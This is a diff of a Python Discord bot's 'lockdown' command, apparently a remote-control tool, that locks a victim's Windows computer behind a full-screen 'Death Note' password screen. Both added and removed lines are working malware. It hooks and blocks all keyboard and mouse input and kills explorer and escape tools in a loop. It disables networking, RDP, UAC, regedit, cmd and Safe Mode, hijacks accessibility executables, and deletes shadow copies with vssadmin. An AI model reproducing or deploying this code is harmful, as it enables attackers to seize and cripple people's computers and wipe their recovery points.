+                "sethc.exe", "utilman.exe", "rstrui.exe", "msconfig.exe", "compmgmt.msc", "gpedit.msc", "lusrmgr.msc", "secpol.msc", "control.exe"
             ]
-
-            def low_level_keyboard_proc(nCode, wParam, lParam):
-                if nCode == 0:
-                    vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong * 6))[0][0]
-                    alt_pressed = (user32.GetAsyncKeyState(0x12) & 0x8000) != 0
-                    ctrl_pressed = (user32.GetAsyncKeyState(0x11) & 0x8000) != 0
-                    win_pressed = (user32.GetAsyncKeyState(0x5B) & 0x8000) != 0 or (user32.GetAsyncKeyState(0x5C) & 0x8000) != 0
-                    if vk_code in blocked_vk or alt_pressed or ctrl_pressed or win_pressed:
-                        return 1
-                return user32.CallNextHookEx(None, nCode, wParam, lParam)
-
-            def low_level_mouse_proc(nCode, wParam, lParam):
-                # Block all mouse input
-                if nCode == 0:
-                    return 1
-                return user32.CallNextHookEx(None, nCode, wParam, lParam)
-
-            CMPFUNC_KB = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_void_p)
-            CMPFUNC_MS = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_void_p)
-            pointer_kb = CMPFUNC_KB(low_level_keyboard_proc)
-            pointer_ms = CMPFUNC_MS(low_level_mouse_proc)
-            hook_id_kb = user32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer_kb, kernel32.GetModuleHandleW(None), 0)
-            hook_id_ms = user32.SetWindowsHookExA(WH_MOUSE_LL, pointer_ms, kernel32.GetModuleHandleW(None), 0)
-
-            def pump():
-                msg = ctypes.wintypes.MSG()
-                while True:
-                    bRet = user32.GetMessageW(ctypes.byref(msg), 0, 0, 0)
-                    if bRet == 0:
-                        break
-                    user32.TranslateMessage(ctypes.byref(msg))
-                    user32.DispatchMessageW(ctypes.byref(msg))
-
-            t = threading.Thread(target=pump, daemon=True)
-            t.start()
-            return (hook_id_kb, pointer_kb, hook_id_ms, pointer_ms)
-
-        def kill_explorer():
+            for exe in exe_list:
+                try:
+                    winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + exe)
+                except Exception:
+                    pass
+            # Restore accessibility tools
+            windir = os.environ.get("WINDIR", "C:\\Windows")
+            sys32 = os.path.join(windir, "System32")
+            tools = ["sethc.exe", "utilman.exe", "osk.exe", "magnify.exe", "narrator.exe", "DisplaySwitch.exe", "atbroker.exe"]
+            for tool in tools:
+                tool_path = os.path.join(sys32, tool)
+                try:
+                    if os.path.exists(tool_path + ".bak"):
+                        os.remove(tool_path)
+                        os.rename(tool_path + ".bak", tool_path)
+                except Exception:
+                    pass
+            # Restore network
             try:
-                subprocess.Popen("taskkill /f /im explorer.exe", shell=True)
+                import netifaces
+                for iface in netifaces.interfaces():
+                    try:
+                        run(f'netsh interface set interface "{iface}" admin=enable')
+                    except Exception:
+                        pass
             except Exception:
                 pass
-
-        def start_explorer():
+            # Restore explorer
             try:
                 subprocess.Popen("explorer.exe", shell=True)
             except Exception:
                 pass
 
-        def is_explorer_running():
-            try:
-                for proc in psutil.process_iter(['name']):
-                    if proc.info['name'] and proc.info['name'].lower() == "explorer.exe":
-                        return True
-            except Exception:
-                pass
-            return False
+        # --- END: Modern, Robust, Fully Functional Lockdown ---
 
-        def disable_network(restore=False):
-            nonlocal original_network_state
-            try:
-                import netifaces
-            except ImportError:
-                subprocess.call([sys.executable, "-m", "pip", "install", "netifaces"])
-                import netifaces
-            try:
-                if not restore:
-                    original_network_state = []
-                    for iface in netifaces.interfaces():
-                        try:
-                            subprocess.call(f'netsh interface set interface "{iface}" admin=disable', shell=True)
-                            original_network_state.append(iface)
-                        except Exception:
-                            pass
-                else:
-                    for iface in original_network_state:
-                        try:
-                            subprocess.call(f'netsh interface set interface "{iface}" admin=enable', shell=True)
-                        except Exception:
-                            pass
-            except Exception:
-                pass
+        # --- Start lockdown threads and window ---
 
-        def disable_rdp(restore=False):
-            nonlocal original_rdp_state
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server", 0, winreg.KEY_ALL_ACCESS)
-                if not restore:
-                    try:
-                        original_rdp_state, _ = winreg.QueryValueEx(key, "fDenyTSConnections")
-                    except Exception:
-                        original_rdp_state = None
-                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
-                else:
-                    if original_rdp_state is not None:
-                        winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, original_rdp_state)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
+        # 1. Apply all lockdowns
+        block_escape_tools_ifeo()
+        lockdown_registry()
+        lockdown_boot()
+        hijack_accessibility_tools()
+        lockdown_services()
+        disable_network()
+        kill_escapes()
 
-        def disable_sticky_keys():
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Accessibility\StickyKeys")
-                winreg.SetValueEx(key, "Flags", 0, winreg.REG_SZ, "506")
-                winreg.CloseKey(key)
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Accessibility\Keyboard Response")
-                winreg.SetValueEx(key, "Flags", 0, winreg.REG_SZ, "122")
-                winreg.CloseKey(key)
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Accessibility\ToggleKeys")
-                winreg.SetValueEx(key, "Flags", 0, winreg.REG_SZ, "58")
-                winreg.CloseKey(key)
-            except Exception:
-                pass
+        # 2. Start killer thread (keeps killing escape tools)
+        def killer_loop():
+            while True:
+                kill_escapes()
+                time.sleep(0.2)
+        threading.Thread(target=killer_loop, daemon=True).start()
 
-        def disable_system_restore():
-            try:
-                subprocess.call("vssadmin delete shadows /all /quiet", shell=True)
-                subprocess.call("wmic shadowcopy delete", shell=True)
-                subprocess.call("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f", shell=True)
-            except Exception:
-                pass
+        # 3. Block input
+        input_blocker = threading.Thread(target=block_input_thread, daemon=True)
+        input_blocker.start()
 
-        def disable_uac():
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_ALL_ACCESS)
-                winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
+        # 4. Watchdog
+        threading.Thread(target=watchdog_thread, args=(os.getpid(),), daemon=True).start()
 
-        def disable_shutdown_sleep_logoff():
-            try:
-                # Remove shutdown/sleep/logoff from start menu
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
-                winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 1)
-                winreg.SetValueEx(key, "NoLogOff", 0, winreg.REG_DWORD, 1)
-                winreg.SetValueEx(key, "NoSleep", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        def disable_regedit(restore=False):
-            nonlocal original_regedit_disabled
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-                if not restore:
-                    try:
-                        original_regedit_disabled, _ = winreg.QueryValueEx(key, "DisableRegistryTools")
-                    except Exception:
-                        original_regedit_disabled = None
-                    winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
-                else:
-                    if original_regedit_disabled is not None:
-                        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, original_regedit_disabled)
-                    else:
-                        try:
-                            winreg.DeleteValue(key, "DisableRegistryTools")
-                        except Exception:
-                            pass
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        def disable_cmd(restore=False):
-            nonlocal original_cmd_disabled
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System")
-                if not restore:
-                    try:
-                        original_cmd_disabled, _ = winreg.QueryValueEx(key, "DisableCMD")
-                    except Exception:
-                        original_cmd_disabled = None
-                    winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
-                else:
-                    if original_cmd_disabled is not None:
-                        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, original_cmd_disabled)
-                    else:
-                        try:
-                            winreg.DeleteValue(key, "DisableCMD")
-                        except Exception:
-                            pass
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        def disable_run_dialog(restore=False):
-            nonlocal original_run_disabled
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
-                if not restore:
-                    try:
-                        original_run_disabled, _ = winreg.QueryValueEx(key, "NoRun")
-                    except Exception:
-                        original_run_disabled = None
-                    winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 1)
-                else:
-                    if original_run_disabled is not None:
-                        winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, original_run_disabled)
-                    else:
-                        try:
-                            winreg.DeleteValue(key, "NoRun")
-                        except Exception:
-                            pass
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        def restore_windows_state():
-            set_taskmgr_disabled(restore=True)
-            block_ctrl_alt_del(restore=True)
-            block_safe_mode(restore=True)
-            disable_network(restore=True)
-            disable_rdp(restore=True)
-            disable_regedit(restore=True)
-            disable_cmd(restore=True)
-            disable_run_dialog(restore=True)
-            if not is_explorer_running():
-                start_explorer()
-            try:
-                subprocess.Popen("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", shell=True)
-            except Exception:
-                pass
-            try:
-                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
-                for v in ["NoClose", "NoLogOff", "NoSleep", "NoRun"]:
-                    try:
-                        winreg.DeleteValue(key, v)
-                    except Exception:
-                        pass
-                winreg.CloseKey(key)
-            except Exception:
-                pass
-
-        # --- REWRITE: Improved lockdown_window for reliability and Tkinter event loop handling ---
-
+        # 5. Tkinter Lock Window
         def lockdown_window():
-            nonlocal original_explorer_running, original_taskmgr_disabled
-
-            original_explorer_running = is_explorer_running()
-
-            try:
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ)
-                val, typ = winreg.QueryValueEx(key, "DisableTaskMgr")
-                original_taskmgr_disabled = (val == 1)
-                winreg.CloseKey(key)
-            except Exception:
-                original_taskmgr_disabled = False
-
-            set_taskmgr_disabled(True)
-            block_ctrl_alt_del()
-            block_safe_mode()
-            disable_network()
-            disable_rdp()
-            disable_sticky_keys()
-            disable_system_restore()
-            disable_uac()
-            disable_shutdown_sleep_logoff()
-            disable_regedit()
-            disable_cmd()
-            disable_run_dialog()
-
-            kill_explorer()
-
-            hook_ids = block_win_keys_and_mouse()
-
-            threading.Thread(target=killer_thread, daemon=True).start()
-
-            # --- Tkinter window setup ---
             root = tk.Tk()
             root.title("DEATH NOTE - SYSTEM LOCKED")
             root.attributes("-fullscreen", True)
             root.attributes("-topmost", True)
-            root.configure(bg="#1a0000")  # Darker, bloodier background
+            root.configure(bg="#1a0000")
             root.protocol("WM_DELETE_WINDOW", lambda: None)
             root.resizable(False, False)
-
             try:
                 root.overrideredirect(True)
             except Exception:
@@ -4639,15 +4173,12 @@ async def lockdown(ctx):
             root.bind_all("<Button>", lambda e: "break")
             root.bind_all("<Motion>", lambda e: "break")
 
-            frame = tk.Frame(root, bg="#2d0000")  # Bloodier frame
+            frame = tk.Frame(root, bg="#2d0000")
             frame.place(relx=0.5, rely=0.5, anchor="center")
 
-            # Add blood spatters and drops using Canvas
             canvas = tk.Canvas(root, bg="#1a0000", highlightthickness=0, bd=0)
             canvas.place(relx=0, rely=0, relwidth=1, relheight=1)
-            # Draw blood drops and spatters (red ovals and splats)
             for i in range(18):
-                import random
                 x = random.randint(0, root.winfo_screenwidth() - 50)
                 y = random.randint(0, root.winfo_screenheight() - 50)
                 w = random.randint(18, 80)
@@ -4707,7 +4238,7 @@ async def lockdown(ctx):
 
             entry.config(highlightthickness=2, highlightbackground="#e74c3c", highlightcolor="#e74c3c")
 
-            footer = tk.Label(frame, text="Locked by cerlux | Death Note Edition | v4.0 ULTIMATE+", fg="#ff6666", bg="#2d0000", font=("Segoe UI", 12, "italic"))
+            footer = tk.Label(frame, text="Locked by cerlux | Death Note Edition | v5.0 ULTIMATE+", fg="#ff6666", bg="#2d0000", font=("Segoe UI", 12, "italic"))
             footer.pack(pady=(30, 0))
 
             clock_label = tk.Label(frame, text="", fg="#ff3333", bg="#2d0000", font=("Segoe UI", 16, "bold"))
@@ -4717,9 +4248,7 @@ async def lockdown(ctx):
                 root.after(1000, update_clock)
             update_clock()
 
-            # --- REWRITE: Make fade_status and try_unlock robust and always show status ---
             def fade_status(msg, color):
-                # Always show the status message for a short time, then clear
                 status.config(text=msg, fg=color)
                 status.update()
                 root.after(1200, lambda: status.config(text=""))
@@ -4729,131 +4258,16 @@ async def lockdown(ctx):
                     status.config(text="✅ Password correct! Your system will be fully restored.", fg="#2ecc71")
                     root.update()
                     root.after(1200, lambda: None)
-                    # --- FULL RESTORATION ---
                     try:
-                        user32 = ctypes.windll.user32
-                        # Unhook keyboard and mouse hooks
-                        user32.UnhookWindowsHookEx(hook_ids[0])
-                        user32.UnhookWindowsHookEx(hook_ids[2])
-                    except Exception:
-                        pass
-                    try:
+                        restore_everything()
                         from tkinter import messagebox
                         messagebox.showinfo("Unlocked", "Your system has been restored. Welcome back!")
                     except Exception:
                         pass
                     try:
-                        restore_windows_state()
-                        # Forcefully restart explorer and critical services
-                        start_explorer()
-                        # Re-enable services that may have been disabled
-                        subprocess.call('sc config TermService start= demand', shell=True)
-                        subprocess.call('sc config WinDefend start= auto', shell=True)
-                        subprocess.call('sc config wuauserv start= auto', shell=True)
-                        subprocess.call('sc config BITS start= auto', shell=True)
-                        # Re-enable Task Manager via registry (extra)
-                        try:
-                            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-                            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
-                            winreg.CloseKey(key)
-                        except Exception:
-                            pass
-                        # Re-enable registry tools
-                        try:
-                            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
-                            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
-                            winreg.CloseKey(key)
-                        except Exception:
-                            pass
-                        # Re-enable CMD
-                        try:
-                            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System")
-                            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 0)
-                            winreg.CloseKey(key)
-                        except Exception:
-                            pass
-                        # Re-enable Run dialog
-                        try:
-                            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
-                            winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 0)
-                            winreg.CloseKey(key)
-                        except Exception:
-                            pass
-                        # Re-enable Safe Mode and Recovery via BCDedit
-                        try:
-                            subprocess.call('bcdedit /deletevalue {current} safeboot', shell=True)
-                            subprocess.call('bcdedit /set {current} recoveryenabled Yes', shell=True)
-                            subprocess.call('bcdedit /set {current} bootmenupolicy Standard', shell=True)
-                        except Exception:
-                            pass
-                        # Re-enable system restore
-                        try:
-                            subprocess.call("reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /f", shell=True)
-                        except Exception:
-                            pass
-                        # Re-enable UAC
-                        try:
-                            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, winreg.KEY_ALL_ACCESS)
-                            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 1)
-                            winreg.CloseKey(key)
-                        except Exception:
-                            pass
-                        # Re-enable sticky keys
-                        try:
-                            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Control Panel\\Accessibility\\StickyKeys")
-                            winreg.SetValueEx(key, "Flags", 0, winreg.REG_SZ, "506")
-                            winreg.CloseKey(key)
-                        except Exception:
-                            pass
-                        # Re-enable shutdown/sleep/logoff
-                        try:
-                            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
-                            for v in ["NoClose", "NoLogOff", "NoSleep"]:
-                                try:
-                                    winreg.DeleteValue(key, v)
-                                except Exception:
-                                    pass
-                            winreg.CloseKey(key)
-                        except Exception:
-                            pass
-                        # Re-enable network interfaces
-                        try:
-                            import netifaces
-                            for iface in netifaces.interfaces():
-                                try:
-                                    subprocess.call(f'netsh interface set interface "{iface}" admin=enable', shell=True)
-                                except Exception:
-                                    pass
-                        except Exception:
-                            pass
-                        # Re-enable RDP
-                        try:
-                            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 0, winreg.KEY_ALL_ACCESS)
-                            winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
-                            winreg.CloseKey(key)
-                        except Exception:
-                            pass
-                        # Re-enable accessibility tools
-                        try:
-                            for tool in ["osk.exe", "magnify.exe", "narrator.exe", "sethc.exe", "utilman.exe"]:
-                                tool_path = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", tool)
-                                if os.path.exists(tool_path + ".bak"):
-                                    try:
-                                        os.remove(tool_path)
-                                        os.rename(tool_path + ".bak", tool_path)
-                                    except Exception:
-                                        pass
-                        except Exception:
-                            pass
-                        # Force update system parameters
-                        try:
-                            subprocess.Popen("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", shell=True)
-                        except Exception:
-                            pass
+                        root.destroy()
                     except Exception:
                         pass
-                    root.destroy()
-                    # Remove all lockdown threads and exit
                     os._exit(0)
                 else:
                     fade_status("❌ Incorrect password. Your fate is sealed.", "#e74c3c")
@@ -4861,20 +4275,16 @@ async def lockdown(ctx):
                     entry.focus_set()
 
             entry.bind("<Return>", try_unlock)
-            # Also allow clicking a button to unlock, for reliability
             unlock_btn = tk.Button(frame, text="Unlock", font=("Segoe UI", 16, "bold"), bg="#660000", fg="#fff", command=try_unlock, activebackground="#b30000", activeforeground="#fff")
             unlock_btn.pack(pady=(10, 0))
 
-            # --- REWRITE: Use mainloop, not manual update, for Tkinter reliability ---
             try:
                 root.mainloop()
             except Exception:
                 pass
 
-        t = threading.Thread(target=lockdown_window, daemon=False)  # Not daemon, so window stays alive
+        t = threading.Thread(target=lockdown_window, daemon=False)
         t.start()
-
-        threading.Thread(target=watchdog_thread, args=(os.getpid(),), daemon=True).start()
 
         embed = discord.Embed(
             title="🔒 Lockdown Command Sent (Death Note ULTIMATE+)",
